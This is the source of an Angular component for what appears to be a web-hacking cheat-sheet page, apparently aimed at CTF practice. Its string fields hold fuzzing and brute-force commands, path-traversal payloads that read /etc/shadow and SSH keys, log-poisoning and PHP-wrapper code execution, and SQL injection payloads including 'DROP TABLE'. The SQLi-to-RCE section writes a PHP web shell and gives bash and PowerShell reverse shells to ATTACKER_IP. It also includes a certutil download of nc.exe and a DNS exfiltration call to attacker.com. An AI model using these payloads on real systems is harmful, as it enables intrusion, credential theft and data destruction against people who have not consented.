import { Component } from '@angular/core';
import { CommonModule } from '@angular/common';
import { MatExpansionModule } from '@angular/material/expansion';
import { Terminal } from '../../shared/terminal/terminal';

@Component({
  selector: 'app-common-services',
  standalone: true,
  imports: [CommonModule, MatExpansionModule, Terminal],
  templateUrl: './web.html',
  styleUrl: './web.scss',
})
export class Web {

  selectedWebSection: string | null = null;

  selectWebSection(section: string): void {
    this.selectedWebSection = section;
  }

  clearWebSection(): void {
    this.selectedWebSection = null;
  }

  // =========================================================
  // RECON
  // =========================================================

  webRecon = `
nmap -p- --min-rate 5000 <IP>
nmap -p80,443 -sC -sV <IP>

curl -I http://<IP>
curl -I https://<IP>
  `;

  // =========================================================
  // TECHNOLOGY
  // =========================================================

  webTechnology = `
whatweb http://<IP>
wappalyzer
nikto -h http://<IP>

curl -I http://<IP>
  `;

  webHeaders = `
curl -I http://<IP>
curl -s http://<IP> | head
  `;

  // =========================================================
  // DIRECTORIES
  // =========================================================

  gobuster = `
# Directory brute force
gobuster dir -u http://<IP>/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50

# Basic fuzzing
gobuster dir -u http://<IP>/ -w <WORDLIST> -t 50

# Search for common web extensions
gobuster dir -u http://<IP>/ -w <WORDLIST> -x php,txt,html,js,json -t 50

# Linux / Apache / PHP extensions
gobuster dir -u http://<IP>/ -w <WORDLIST> -x php,phtml,phps,php3,php4,php5,inc,txt,html,conf,ini,log -t 50

# Windows / IIS extensions
gobuster dir -u http://<IP>/ -w <WORDLIST> -x asp,aspx,ashx,asmx,config,txt -t 50

# Search for backup files
gobuster dir -u http://<IP>/ -w <WORDLIST> -x bak,old,save,tmp,backup,orig,swp -t 50

# Search for compressed files
gobuster dir -u http://<IP>/ -w <WORDLIST> -x zip,tar,gz,tgz,bz2,7z,rar -t 50

# Search for database files
gobuster dir -u http://<IP>/ -w <WORDLIST> -x sql,db,db3,sqlite,sqlite3,dump -t 50

# Search for config and secret files
gobuster dir -u http://<IP>/ -w <WORDLIST> -x env,yaml,yml,json,xml,cfg,cnf,pem,key -t 50

# Search for Git and SVN repositories
gobuster dir -u http://<IP>/ -w <WORDLIST> -x git,svn -t 50

# Filtering (status codes)
gobuster dir -u http://<IP>/ -w <WORDLIST> -s 200,204,301,302,307,403 -t 50

# Exclude responses by length
gobuster dir -u http://<IP>/ -w <WORDLIST> --exclude-length 1234

# Hide negative status codes
gobuster dir -u http://<IP>/ -w <WORDLIST> -b 404,400

# Recursive fuzzing
gobuster dir -u http://<IP>/ -w <WORDLIST> -r

# Fuzzing parameters (GET)
gobuster dir -u "http://<IP>/<SUBDIRECTORY>/?FUZZ=1" -w <WORDLIST>

# Fuzzing auth pages (POST)
gobuster dir -u http://<IP>/<SUBDIRECTORY>/ -w <WORDLIST> -m POST --data 'uname=Dummy&passwd=FUZZ&submit=Submit' -H 'Content-Type: application/x-www-form-urlencoded' -t 50

# Subdomain enumeration
gobuster dns -d mydomain.com -w <WORDLIST>

# Virtual hosting
gobuster vhost -u http://mydomain.com -w <WORDLIST> -H 'Host: FUZZ.mydomain.com'

# Virtual hosting with IP
gobuster vhost -u http://<IP> -w <WORDLIST> -H 'Host: FUZZ.thm'

# Useful wordlists
/usr/share/seclists/Discovery/Web-Content/
/usr/share/seclists/Discovery/DNS/
/usr/share/wordlists/dirbuster/
/usr/share/seclists/Discovery/Web-Content/common.txt
/usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
/usr/share/seclists/Discovery/Web-Content/raft-medium-files.txt
`;

feroxbusterCommands = `# Full scan
feroxbuster -u http://<IP>/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 100 -d 1

# Basic directory fuzzing
feroxbuster -u http://<IP>/FUZZ -w <WORDLIST> -t 50

# Common web extensions
feroxbuster -u http://<IP>/FUZZ -w <WORDLIST> -e php,txt,html,js,json -t 50

# Linux / Apache / PHP extensions
feroxbuster -u http://<IP>/FUZZ -w <WORDLIST> -e php,phtml,phps,php3,php4,php5,inc,txt,html,conf,ini,log -t 50

# Windows / IIS extensions
feroxbuster -u http://<IP>/FUZZ -w <WORDLIST> -e asp,aspx,ashx,asmx,config,txt -t 50

# Backup files
feroxbuster -u http://<IP>/FUZZ -w <WORDLIST> -e bak,old,save,tmp,backup,orig,swp -t 50

# Compressed files
feroxbuster -u http://<IP>/FUZZ -w <WORDLIST> -e zip,tar,gz,tgz,bz2,7z,rar -t 50

# Database files
feroxbuster -u http://<IP>/FUZZ -w <WORDLIST> -e sql,db,db3,sqlite,sqlite3,dump -t 50

# Config / secret files
feroxbuster -u http://<IP>/FUZZ -w <WORDLIST> -e env,yaml,yml,json,xml,cfg,cnf,pem,key -t 50

# Recursive scanning
feroxbuster -u http://<IP>/ -w <WORDLIST> -r

# Recursive scan with depth limit
feroxbuster -u http://<IP>/ -w <WORDLIST> -d 2

# HTTPS with self-signed certificate
feroxbuster -u https://<IP>/ -k -w <WORDLIST>

# Filter status codes
feroxbuster -u http://<IP>/FUZZ -w <WORDLIST> --filter-status 404,400

# Filter response size
feroxbuster -u http://<IP>/FUZZ -w <WORDLIST> --filter-size 1234

# Filter words / lines
feroxbuster -u http://<IP>/FUZZ -w <WORDLIST> --filter-words 10 --filter-lines 5

# Extract links
feroxbuster -u http://<IP>/ -w <WORDLIST> -x js,php,html

# Save output
feroxbuster -u http://<IP>/ -w <WORDLIST> -o feroxbuster.txt

# JSON output
feroxbuster -u http://<IP>/ -w <WORDLIST> --json -o ferox.json

# Cookies
feroxbuster -u http://<IP>/ -w <WORDLIST> -C 'PHPSESSID=VALUE'

# Custom headers
feroxbuster -u http://<IP>/ -w <WORDLIST> -H 'Authorization: Bearer TOKEN'

# Custom User-Agent
feroxbuster -u http://<IP>/ -w <WORDLIST> -A 'Mozilla/5.0'

# GET parameter fuzzing
feroxbuster -u 'http://<IP>/<SUBDIRECTORY>/?FUZZ=1' -w <WORDLIST> --filter-size 39

# POST parameter fuzzing
feroxbuster -u http://<IP>/<SUBDIRECTORY>/ -X POST -d 'uname=Dummy&passwd=FUZZ&submit=Submit' -H 'Content-Type: application/x-www-form-urlencoded' --filter-size 1435

# Subdomain enumeration
feroxbuster -u http://FUZZ.mydomain.com -w <WORDLIST> --filter-size 0

# Virtual hosting
feroxbuster -u http://mydomain.com -w <WORDLIST> -H 'Host: FUZZ.mydomain.com' --filter-size 0

# Virtual hosting with IP
feroxbuster -u http://<IP> -w <WORDLIST> -H 'Host: FUZZ.thm'

# Useful wordlists
# /usr/share/seclists/Discovery/Web-Content/
# /usr/share/seclists/Discovery/Web-Content/common.txt
# /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
# /usr/share/seclists/Discovery/Web-Content/raft-medium-files.txt
# /usr/share/seclists/Discovery/Web-Content/big.txt
# /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt

# Useful targets
# .git/ .git/config .git/HEAD .svn/ .hg/ .htaccess .htpasswd backup/ backups/ dev/ test/ admin/ private/ db/ database/ config/ uploads/ api/ old/ tmp/`;

ffufCommands = `# Basic fuzzing
ffuf -c -u http://<IP>/FUZZ -w <WORDLIST> -t 50

# Common web extensions
ffuf -c -u http://<IP>/FUZZ -w <WORDLIST> -e .php,.txt,.html,.js,.json

# Backup files
ffuf -c -u http://<IP>/FUZZ -w <WORDLIST> -e .bak,.old,.save,.swp,.tmp,.backup,.orig

# Database files
ffuf -c -u http://<IP>/FUZZ -w <WORDLIST> -e .sql,.db,.db3,.sqlite,.sqlite3,.dump

# Config / secret files
ffuf -c -u http://<IP>/FUZZ -w <WORDLIST> -e .env,.conf,.cfg,.ini,.json,.xml,.yaml,.yml,.pem,.key

# Windows / IIS files
ffuf -c -u http://<IP>/FUZZ -w <WORDLIST> -e .asp,.aspx,.config,.ashx,.asmx,.txt

# Filter status codes
ffuf -c -u http://<IP>/FUZZ -w <WORDLIST> -fc 404,400

# Filter response size
ffuf -c -u http://<IP>/FUZZ -w <WORDLIST> -fs 0

# Filter words / lines
ffuf -c -u http://<IP>/FUZZ -w <WORDLIST> -fw 39 -fl 10

# GET parameter fuzzing
ffuf -u 'http://<IP>/<SUBDIRECTORY>/?FUZZ=1' -c -w <WORDLIST> -fs 39

# Multiple parameters
ffuf -u 'http://<IP>/page.php?FUZZ1=test&FUZZ2=test' -c -w <WORDLIST>

# POST parameter fuzzing
ffuf -u http://<IP>/<SUBDIRECTORY>/ -c -w <WORDLIST> -X POST -d 'uname=Dummy&passwd=FUZZ&submit=Submit' -H 'Content-Type: application/x-www-form-urlencoded' -fs 1435

# Login brute force
ffuf -u http://<IP>/login -X POST -d 'username=FUZZ&password=FUZZ2' -w users.txt:FUZZ,pass.txt:FUZZ2 -c -fs 1234

# Subdomain enumeration
ffuf -u http://FUZZ.mydomain.com -c -w <WORDLIST> -fs 0

# Virtual hosting
ffuf -u http://mydomain.com -c -w <WORDLIST> -H 'Host: FUZZ.mydomain.com' -fs 0

# Virtual hosting with IP
ffuf -u http://<IP> -H 'Host: FUZZ.thm' -w <WORDLIST> -fs 0

# Recursive fuzzing
ffuf -c -u http://<IP>/FUZZ -w <WORDLIST> -recursion

# Extensions + recursion
ffuf -c -u http://<IP>/FUZZ -w <WORDLIST> -e .php,.txt,.html,.bak,.old -recursion

# Useful wordlists
# /usr/share/seclists/Discovery/Web-Content/
# /usr/share/seclists/Discovery/Web-Content/common.txt
# /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
# /usr/share/seclists/Discovery/Web-Content/raft-medium-files.txt
# /usr/share/seclists/Discovery/DNS/
# /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt

# Useful targets
# .git/ .git/config .git/HEAD .svn/ .hg/ backup/ backups/ dev/ test/ admin/ private/ db/ database/ config/ uploads/ api/ old/ tmp/ logs/ .env web.config`;

wfuzzCommands = `# Basic directory / file fuzzing
wfuzz -c -w <WORDLIST> http://<IP>/FUZZ

# File extension fuzzing
wfuzz -c -w <WORDLIST> -z list,php-txt-html-js-json-bak-old http://<IP>/FUZZ.FUZ2Z

# Hide 403 responses
wfuzz -c -w <WORDLIST> --hc 403 http://<IP>/FUZZ

# Hide multiple status codes
wfuzz -c -w <WORDLIST> --hc 403,404 http://<IP>/FUZZ

# Show only valid responses
wfuzz -c -w <WORDLIST> --sc 200,301,302,307,403 http://<IP>/FUZZ

# Filter by response size
wfuzz -c -w <WORDLIST> --hh 0 http://<IP>/FUZZ

# GET parameter fuzzing
wfuzz -c -w <WORDLIST> http://<IP>/<SUBDIRECTORY>/?FUZZ=1

# Multiple parameters
wfuzz -c -w users.txt -w pass.txt http://<IP>/login?user=FUZZ&pass=FUZ2Z

# POST parameter fuzzing
wfuzz -c -w <WORDLIST> -X POST -d 'uname=admin&passwd=FUZZ&submit=Submit' --hc 403 http://<IP>/<SUBDIRECTORY>/

# Login brute force
wfuzz -c -w users.txt -w passwords.txt -X POST -d 'username=FUZZ&password=FUZ2Z' --hc 401,403 http://<IP>/login

# Subdomain enumeration
wfuzz -c -w <WORDLIST> --hc 0 http://FUZZ.mydomain.com

# Virtual hosting
wfuzz -c -w <WORDLIST> -H 'Host: FUZZ.mydomain.com' --hc 0 http://mydomain.com

# Virtual hosting with IP
wfuzz -c -w <WORDLIST> -H 'Host: FUZZ.thm' http://<IP>

# Header fuzzing
wfuzz -c -w <WORDLIST> -H 'User-Agent: FUZZ' http://<IP>/

# Cookie fuzzing
wfuzz -c -w <WORDLIST> -b 'session=FUZZ' http://<IP>/

# Useful wordlists
# /usr/share/seclists/Discovery/Web-Content/
# /usr/share/seclists/Discovery/Web-Content/common.txt
# /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
# /usr/share/seclists/Discovery/Web-Content/raft-medium-files.txt
# /usr/share/seclists/Discovery/DNS/

# Useful targets
# .git/ .git/config .git/HEAD .svn/ backup/ backups/ admin/ test/ dev/ private/ db/ config/ uploads/ api/ .env web.config`;
  

lfiInclusions = `
# Local File Inclusion (LFI)
# Vulnerable parameters may include:
# page=, file=, path=, doc=, include=, lang=, template=

# Basic LFI test
http://<IP>/index.php?page=../../../../etc/passwd

# Windows
http://<IP>/index.php?page=../../../../boot.ini

# Deep traversal
http://<IP>/index.php?page=../../../../../../../../etc/passwd

# Windows hosts file
http://<IP>/index.php?page=../../../../../../../../Windows/System32/drivers/etc/hosts

# Common useful files
/etc/passwd
/etc/shadow
/home/<user>/.ssh/id_rsa
/var/www/html/config.php
/var/log/apache2/access.log

# Windows
C:\\Windows\\System32\\drivers\\etc\\hosts
C:\\inetpub\\wwwroot\\web.config

# Typical vulnerable code
include($_GET['page']);
`;

logPoisoning = `
# Log Poisoning

# Common Linux logs
/var/log/apache2/access.log
/var/log/apache2/error.log
/var/log/httpd/access_log
/var/log/nginx/access.log

# Common Windows logs
C:\\xampp\\apache\\logs\\access.log
C:\\xampp\\apache\\logs\\error.log
C:\\inetpub\\logs\\LogFiles\\W3SVC1\\

# Step 1 - Inject PHP into the User-Agent
curl -A "<PHP_PAYLOAD>" http://<IP>/

# Step 2 - Include the poisoned log
http://<IP>/index.php?page=../../../../../../../../../var/log/apache2/access.log&cmd=id

# Step 3 - URL encode spaces if required
http://<IP>/index.php?page=../../../../../../../../../var/log/apache2/access.log&cmd=ls%20-la

# Windows
http://<IP>/index.php?page=../../../../../../../../xampp/apache/logs/access.log&cmd=dir
`;

phpWrappers = `
# PHP Wrappers

# php://filter - Read source code
http://<IP>/index.php?page=php://filter/convert.base64-encode/resource=index.php

# Decode Base64
echo BASE64_OUTPUT | base64 -d

# data://
http://<IP>/index.php?page=data://text/plain,<PHP_PAYLOAD>

# Execute commands
http://<IP>/index.php?page=data://text/plain,<?php system('id'); ?>

# data:// Base64
http://<IP>/index.php?page=data://text/plain;base64,<BASE64_PAYLOAD>

# php://input
curl -X POST -d "<?php system('ls'); ?>" "http://<IP>/index.php?page=php://input"

# expect:// (if enabled)
http://<IP>/index.php?page=expect://id
`;



rfi = `
# Remote File Inclusion (RFI)

# Requires allow_url_include=On

# Start HTTP server
python3 -m http.server 80

# Host the remote PHP file
http://<ATTACKER-IP>/shell.php

# Include remote file
http://<IP>/index.php?page=http://<ATTACKER-IP>/shell.php

# Example with parameter
http://<IP>/index.php?page=http://<ATTACKER-IP>/shell.php&cmd=id

# Reverse shell
<PHP_REVERSHELL>
`;

sqliConcepts = `
# SQL Injection - Basic Concepts

# Description
SQL Injection (SQLi) allows an attacker to manipulate SQL queries
through unsanitized user input.

# Example SQL query
SELECT * FROM users WHERE user_name='leon';

# Vulnerable PHP backend
$sql_query = "SELECT * FROM users WHERE user_name= '$uname' AND password='$passwd'";

# Core Mental Model
# 1. User input is concatenated into SQL query
# 2. Query structure becomes attacker-controlled
# 3. Goal is to change logic, extract data, or execute system actions
`;


sqliTypes = `
# SQL Injection - Types

# Error-based SQLi
' OR 1=1 --

# Union-based SQLi
' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3--

' UNION SELECT null, database(), user(), @@version --

' UNION SELECT null, table_name, column_name
FROM information_schema.columns
WHERE table_schema=database() --

# Blind SQL Injection

# Boolean-based
' AND 1=1 --
' AND 1=2 --

' AND IF(SUBSTRING(user(),1,1)='a',1,0) --

# Time-based
' AND IF(1=1, SLEEP(5), 0) --

# Stacked Queries
'; DROP TABLE users; --

# Requires support for multiple statements
`;


sqliTesting = `
# SQL Injection - Initial Testing

# Authentication bypass
' OR 1=1 --
" OR 1=1 --
') OR 1=1 --

# Alternative comparisons
' OR '1'='1
" OR "1"="1

# Delay testing
' OR SLEEP(5) --
' AND SLEEP(5) --

# Comment styles
--
#
/* */
`;


sqliFilterBypass = `
# SQL Injection - Filter Bypass

# Common bypass variations
' OR 1=1 -- -
' OR 1=1#
' OR '1'='1'--

# Whitespace bypass
'/**/OR/**/1=1--

# Encoding
%27 OR 1=1 --

# Case manipulation
' oR 1=1 --

# MySQL inline comments
'/*!OR*/1=1--
`;


sqliUnion = `
# SQL Injection - UNION Based

# Requirements
# - Same number of columns
# - Compatible data types

# Find number of columns
' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3--

# Basic UNION payload
' UNION SELECT null,null,null --

# System enumeration
' UNION SELECT null, database(), user(), @@version --

# Schema enumeration
' UNION SELECT null, table_name, column_name
FROM information_schema.columns
WHERE table_schema=database() --
`;


sqliBlind = `
# SQL Injection - Blind

# Boolean-based extraction
' AND SUBSTRING(user(),1,1)='a' --

# Character-by-character extraction
' AND ASCII(SUBSTRING(user(),1,1))=97 --

# Time-based extraction
' AND IF(ASCII(SUBSTRING(user(),1,1))=97, SLEEP(5), 0) --

# Boolean logic
' AND 1=1 --
' AND 1=2 --

# Time delay
' AND SLEEP(5) --
`;


sqliEnumeration = `
# SQL Injection - Enumeration

# Current database
database()

# Current database user
user()

# Database version
@@version

# Current user
current_user()

# Version
version()

# Information schema
information_schema.tables
information_schema.columns

# Example
' UNION SELECT null, database(), user(), @@version --
`;


sqliRce = `
# SQL Injection → RCE

# Core attack chain
SQLi
→ DB Enumeration
→ File Read / File Write / Command Execution
→ Web Shell
→ Reverse Shell
→ System Access


# ==========================================
# LINUX - MYSQL / MARIADB
# ==========================================

# Read local files
SELECT LOAD_FILE('/etc/passwd');

# Useful targets
/etc/passwd
/etc/shadow
/var/www/html/config.php
/home/user/.ssh/id_rsa

# Write PHP web shell
SELECT '<?php system($_GET["cmd"]); ?>'
INTO OUTFILE '/var/www/html/shell.php';

# Trigger commands
http://TARGET/shell.php?cmd=id
http://TARGET/shell.php?cmd=whoami

# Listener
nc -lvnp 4444

# Trigger reverse shell
http://TARGET/shell.php?cmd=bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'


# ==========================================
# POSTGRESQL
# ==========================================

# Command execution
COPY (SELECT '') TO PROGRAM 'id';

# Reverse shell
COPY (SELECT '') TO PROGRAM
'bash -c "bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1"';


# ==========================================
# WINDOWS - MSSQL
# ==========================================

# Command execution
EXEC xp_cmdshell 'whoami';

EXEC xp_cmdshell 'ipconfig';

EXEC xp_cmdshell 'net user';

# Enable xp_cmdshell if required
EXEC sp_configure 'show advanced options',1;
RECONFIGURE;

EXEC sp_configure 'xp_cmdshell',1;
RECONFIGURE;


# ==========================================
# POWERSHELL
# ==========================================

# Listener
nc -lvnp 4444

# PowerShell reverse shell
EXEC xp_cmdshell 'powershell -NoP -NonI -W Hidden -Exec Bypass -Command
$client = New-Object System.Net.Sockets.TCPClient("ATTACKER_IP",4444);
$stream = $client.GetStream();
[byte[]]$bytes = 0..65535|%{0};
while(($i = $stream.Read($bytes,0,$bytes.Length)) -ne 0){
$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);
$sendback = (iex $data 2>&1 | Out-String );
$sendback2 = $sendback + "PS " + (pwd).Path + "> ";
$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
$stream.Write($sendbyte,0,$sendbyte.Length);
$stream.Flush()
}';


# ==========================================
# FILE DOWNLOAD
# ==========================================

# Download payload using certutil
EXEC xp_cmdshell 'certutil -urlcache -split -f
http://ATTACKER_IP/nc.exe C:\Windows\Temp\nc.exe';


# Spawn netcat shell
EXEC xp_cmdshell 'C:\Windows\Temp\nc.exe ATTACKER_IP 4444 -e cmd.exe';


# ==========================================
# ATTACK CHAIN
# ==========================================

SQLi
→ File Read
→ File Write
→ Web Shell
→ Command Execution
→ Reverse Shell
→ Privilege Escalation
`;


sqliOob = `
# Out-of-Band (OOB) SQL Injection

# Used when no direct output is visible.

# MySQL file/DNS-style request
SELECT LOAD_FILE(CONCAT('\\\\attacker.com\\', database()));

# OOB techniques can use:
# - DNS exfiltration
# - HTTP requests
# - External callbacks
`;


sqliFlow = `
# SQL Injection - Practical Exploitation Flow

# 1. Detect injection point
'
"
boolean change

# 2. Identify SQLi type
Error-based
Union-based
Blind
Time-based
Stacked

# 3. Determine number of columns
' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3--

# 4. Extract DB information
database()
user()
@@version()

# 5. Enumerate schema
information_schema.tables
information_schema.columns

# 6. Enumerate users / privileges

# 7. Test file read / file write

# 8. Test command execution

# 9. Obtain shell if possible

# 10. Continue with privilege escalation
`;


sqliNotes = `
# SQL Injection - Important Notes

# Always confirm the injection type before testing large payloads.

# Blind SQLi is common in modern applications.

# WAF bypass requires adapting the payload to the filter.

# Identify the DBMS before using DB-specific syntax.

# Common DBMS
MySQL / MariaDB
MSSQL
PostgreSQL

# RCE depends heavily on database privileges.

# MySQL FILE privilege can be critical.

# xp_cmdshell may be disabled in MSSQL.

# SQLi does not automatically mean RCE.

# Typical attack chain
SQLi
→ Enumeration
→ Data Extraction
→ File Read / Write
→ Command Execution
→ Shell
→ Privilege Escalation
`;

fileInclusionWorkflow = `
# File Inclusion Workflow

# 1. Identify potentially vulnerable parameters
page=
file=
path=
include=
template=
lang=

# 2. Confirm LFI
../../../../etc/passwd

# 3. Try Windows files
../../../../boot.ini
../../../../Windows/System32/drivers/etc/hosts

# 4. Attempt source disclosure
php://filter/convert.base64-encode/resource=index.php

# 5. Look for useful files
/etc/passwd
/etc/shadow
/var/log/apache2/access.log
/var/www/html/config.php

# 6. Test log poisoning

# 7. Test PHP wrappers

# 8. If remote inclusion is possible, test RFI

# 9. Escalate to code execution where applicable
`;

directoryTraversal = `
# ==========================================
# BASIC DIRECTORY TRAVERSAL
# ==========================================

# Linux - /etc/passwd
http://<IP>/index.php?page=../../../../etc/passwd

# Windows - hosts
http://<IP>/index.php?page=../../../../../../Windows/System32/drivers/etc/hosts

# SSH private key
http://<IP>/index.php?page=../../../../home/<user>/.ssh/id_rsa


# ==========================================
# PARAMETER ENUMERATION
# ==========================================

# Common vulnerable parameters
page=
file=
path=
doc=
folder=
include=
lang=
template=

# Example
http://<IP>/index.php?page=about.html

# Test traversal
http://<IP>/index.php?page=../../../../etc/passwd


# ==========================================
# TRAVERSAL PAYLOADS
# ==========================================

# Basic
../../../../etc/passwd

# Deep traversal
../../../../../../../../etc/passwd

# Windows
..\\..\\..\\..\\Windows\\System32\\drivers\\etc\\hosts

# Null byte - legacy systems
../../../../etc/passwd%00


# ==========================================
# FILTER BYPASS
# ==========================================

# URL encoding
%2e%2e%2f%2e%2e%2fetc/passwd

# Double encoding
%252e%252e%252f

# Backslashes - Windows
..\\..\\..\\..\\Windows\\System32\\drivers\\etc\\hosts

# Mixed encoding
%2e%2e/\\%2e%2e/\\etc/passwd

# Dot obfuscation
....//....//....//etc/passwd

# Alternative dot obfuscation
....\\/....\\/....\\/etc/passwd

# Mixed traversal
..../..../..../..../etc/passwd

# Mixed traversal with current directory
../.././../.././etc/passwd

# Redundant slashes
../../../../etc//passwd

# Current directory
../../../../etc/./passwd


# ==========================================
# USEFUL LINUX FILES
# ==========================================

/etc/passwd
/etc/shadow
/home/<user>/.ssh/id_rsa
/var/log/auth.log
/var/www/html/config.php


# ==========================================
# USEFUL WINDOWS FILES
# ==========================================

C:\\Windows\\System32\\drivers\\etc\\hosts
C:\\inetpub\\wwwroot\\web.config
C:\\inetpub\\logs\\LogFiles\\W3SVC1\\


# ==========================================
# QUICK TESTING
# ==========================================

# curl
curl "http://<IP>/index.php?page=../../../../etc/passwd"

# Burp Suite
# Intercept request -> modify parameter -> send payload


# ==========================================
# NOTES
# ==========================================

# Try different traversal depths.
# Test both encoded and unencoded payloads.
# Check for ../ filtering.
# Test both / and \\ on Windows targets.
# Combine with LFI / file inclusion when applicable.
`;
  webDirectories = `
ffuf -u http://<IP>/FUZZ -w /usr/share/seclists/Discovery/Web-Content/common.txt

gobuster dir -u http://<IP> \\
-w /usr/share/wordlists/dirb/common.txt

feroxbuster -u http://<IP>
  `;

  webFiles = `
ffuf -u http://<IP>/FUZZ \\
-w /usr/share/seclists/Discovery/Web-Content/common.txt \\
-e .php,.html,.txt,.bak,.zip,.old
  `;

  // =========================================================
  // VIRTUAL HOSTS
  // =========================================================

  webVhosts = `
ffuf -u http://<IP> \\
-H "Host: FUZZ.<DOMAIN>" \\
-w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt

gobuster vhost -u http://<IP> \\
-w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
  `;

  // =========================================================
  // AUTHENTICATION
  // =========================================================

  webAuthentication = `
curl -i http://<IP>/login

# Inspect:
# - Login parameters
# - Error messages
# - Username enumeration
# - Rate limiting
# - Authentication tokens
  `;

  webSessions = `
curl -I http://<IP>/login

# Inspect:
# - Set-Cookie
# - Session identifiers
# - Secure
# - HttpOnly
# - SameSite
  `;

  // =========================================================
  // PARAMETERS
  // =========================================================

  webParameters = `
ffuf -u "http://<IP>/page.php?FUZZ=test" \\
-w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt

arjun -u http://<IP>/page.php
  `;

  // =========================================================
  // INJECTION
  // =========================================================

  sqlInjection = `
sqlmap -u "http://<IP>/page.php?id=1" --batch

sqlmap -u "http://<IP>/page.php?id=1" \\
--dbs --batch
  `;

  commandInjection = `
# Identify parameters that may execute system commands.

; id
| id
&& id
|| id
\`id\`
$(id)
  `;

  // =========================================================
  // XSS
  // =========================================================

  reflectedXss = `
<script>alert(1)</script>

"><script>alert(1)</script>

"><img src=x onerror=alert(1)>
  `;

  storedXss = `
# Identify persistent input fields:

- Comments
- Profiles
- Messages
- Tickets
- Usernames

Test whether supplied HTML/JavaScript is stored
and executed when the value is viewed.
  `;

  domXss = `
# Inspect JavaScript sinks:

innerHTML
outerHTML
document.write()
eval()
setTimeout()
location

# Trace user-controlled input into dangerous sinks.
  `;

  // =========================================================
  // FILE UPLOAD
  // =========================================================

  fileUpload = `
# Test:

- Extension validation
- MIME type validation
- Content validation
- Filename manipulation
- Double extensions
- Path traversal
- Server-side processing

Example:

file.php.jpg
file.phtml
file.php%00.jpg
  `;

  // =========================================================
  // LFI / RFI
  // =========================================================

  lfi = `
# Common parameters:

?page=
?file=
?path=
?include=
?template=
?document=

Example:

http://<IP>/index.php?page=../../../../etc/passwd
  `;

  // =========================================================
  // SSRF
  // =========================================================

  ssrf = `
# Test server-side URL parameters:

?url=
?uri=
?path=
?dest=
?redirect=
?link=

Example:

http://127.0.0.1
http://localhost
  `;

  // =========================================================
  // API
  // =========================================================

  apiDiscovery = `
ffuf -u http://<IP>/FUZZ \\
-w /usr/share/seclists/Discovery/Web-Content/common.txt

# Look for:

/api
/api/v1
/api/v2
/swagger
/swagger.json
/openapi.json
/graphql
  `;

  apiTesting = `
# Test:

- Authentication
- Authorization
- IDOR
- HTTP methods
- Hidden parameters
- Rate limiting
- Input validation

curl -i http://<IP>/api/v1/users
  `;
}